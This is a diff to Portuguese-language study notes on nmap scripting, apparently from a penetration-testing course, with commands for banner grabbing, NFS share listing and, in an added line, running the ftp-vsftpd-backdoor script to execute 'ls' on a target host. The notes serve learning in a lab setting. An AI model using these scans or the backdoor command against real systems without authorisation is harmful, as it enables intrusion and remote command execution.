@@ -15,8 +15,10 @@ cd /usr/share/nmap/scripts     #acesso a pasta de scripts, nessa pasta há scrip
 # vulnerabilidades em roteadores de marcas específicas entre outros  
 nmap --scripthelp http-dlink-backdoor.nse  # informar o que script pode fazer e como usa-lo
 nmap 192.168.15.0/24 -p 25 --script banner.nse  # será realizado uma varredura na rede, na porta 25 (smtp)
-# usando o script banner  (9:24)
+# usando o script banner 
 nmap --script=nfs-ls 192.168.0.18  # faz a varredura das portas e informa se há compartilhamento
-# de volume e tipos de arquivos (nfs porta 2049, compartilhamento de arquivo) 13:25
+# de volume e tipos de arquivos (nfs porta 2049, compartilhamento de arquivo) 
+namp --script ftp-vsftpd-backdoor.nse --script-args ftp-vsftpd-backdoor.cmd="ls" 192.168.212.21  #informar
+#as portas abertas, mostra as vulberabilidades e o argumento ls mostra os arquivos na pasta.
 
 
